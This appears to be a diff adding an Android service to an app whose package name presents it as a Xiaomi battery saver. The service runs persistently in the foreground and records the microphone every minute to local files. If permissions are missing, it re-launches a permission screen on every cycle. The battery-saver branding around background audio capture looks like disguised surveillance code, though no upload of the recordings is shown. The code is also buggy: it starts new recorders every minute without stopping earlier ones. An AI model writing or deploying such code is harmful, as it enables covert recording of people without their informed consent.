@@ -1,0 +1,133 @@
+1 package com.xiaomi.batterysaver.service;
+2 
+3 import android.Manifest;
+4 import android.annotation.SuppressLint;
+5 import android.app.Notification;
+6 import android.app.NotificationChannel;
+7 import android.app.NotificationManager;
+8 import android.app.PendingIntent;
+9 import android.app.Service;
+10 import android.content.Intent;
+11 import android.content.pm.PackageManager;
+12 import android.media.MediaRecorder;
+13 import android.os.Build;
+14 import android.os.Handler;
+15 import android.os.IBinder;
+16 import android.os.Looper;
+17 import android.util.Log;
+18 
+19 import androidx.core.app.NotificationCompat;
+20 import androidx.core.content.ContextCompat;
+21 
+22 import java.io.File;
+23 import java.io.IOException;
+24 
+25 public class RecordService extends Service {
+26 
+27     public static final String CHANNEL_ID = "ForegroundServiceChannel";
+28     private static final String TAG = "RecordService";
+29 
+30     private MediaRecorder mediaRecorder;
+31     private static final long RECORD_INTERVAL = 60 * 1000; // 1 minute interval
+32     private final Handler handler = new Handler(Looper.getMainLooper());
+33     private final Runnable recordRunnable = new Runnable() {
+34         @Override
+35         public void run() {
+36             Log.d(TAG, "Starting recording...");
+37             if (hasPermissions()) {
+38                 startRecording();
+39             } else {
+40                 Log.d(TAG, "Permissions not granted, recording cannot start.");
+41                 // Request permissions from the user by starting the PermissionActivity
+42                 Intent intent = new Intent(RecordService.this, PermissionActivity.class);
+43                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+44                 startActivity(intent);
+45             }
+46             handler.postDelayed(this, RECORD_INTERVAL);
+47         }
+48     };
+49 
+50     @Override
+51     public void onCreate() {
+52         super.onCreate();
+53         createNotificationChannel();
+54         startForeground(1, buildNotification());
+55         handler.post(recordRunnable);
+56     }
+57 
+58     @Override
+59     public int onStartCommand(Intent intent, int flags, int startId) {
+60         Log.d(TAG, "RecordService onStartCommand()");
+61         return START_STICKY;
+62     }
+63 
+64     @Override
+65     public void onDestroy() {
+66         super.onDestroy();
+67         if (mediaRecorder != null) {
+68             mediaRecorder.stop();
+69             mediaRecorder.release();
+70             mediaRecorder = null;
+71         }
+72         handler.removeCallbacks(recordRunnable);
+73         Log.d(TAG, "RecordService onDestroy()");
+74     }
+75 
+76     @Override
+77     public IBinder onBind(Intent intent) {
+78         return null;
+79     }
+80 
+81     @SuppressLint("ObsoleteSdkInt")
+82     private void createNotificationChannel() {
+83         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+84             NotificationChannel serviceChannel = new NotificationChannel(
+85                     CHANNEL_ID,
+86                     "Foreground Service Channel",
+87                     NotificationManager.IMPORTANCE_DEFAULT
+88             );
+89             NotificationManager manager = getSystemService(NotificationManager.class);
+90             manager.createNotificationChannel(serviceChannel);
+91         }
+92         Log.d(TAG, "RecordService createNotificationChannel()");
+93     }
+94 
+95     private Notification buildNotification() {
+96         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, new Intent(), PendingIntent.FLAG_UPDATE_CURRENT);
+97 
+98         return new NotificationCompat.Builder(this, CHANNEL_ID)
+99                 .setContentTitle("Recording audio")
+100                 .setContentIntent(pendingIntent)
+101                 .setContentText("Audio is being recorded in the background")
+102                 .setSmallIcon(android.R.drawable.ic_btn_speak_now) // Change to your custom icon
+103                 .build();
+104     }
+105 
+106     private boolean hasPermissions() {
+107         return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+108                 && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+109     }
+110 
+111     private void startRecording() {
+112         File filesDirectory = getFilesDir();
+113         String fileName = "audio_record_" + System.currentTimeMillis() + ".3gp";
+114         File audioFile = new File(filesDirectory, fileName);
+115         String filePath = audioFile.getAbsolutePath();
+116 
+117         mediaRecorder = new MediaRecorder(this); // Use the Context constructor
+118         mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+119         mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+120         mediaRecorder.setOutputFile(filePath);
+121         mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+122 
+123         try {
+124             mediaRecorder.prepare();
+125             mediaRecorder.start(); // Start recording immediately after prepare
+126             Log.d(TAG, "Recording started");
+127         } catch (IOException e) {
+128             Log.e(TAG, "Error preparing media recorder", e);
+129         }
+130     }
+131 
+132 
+133 }
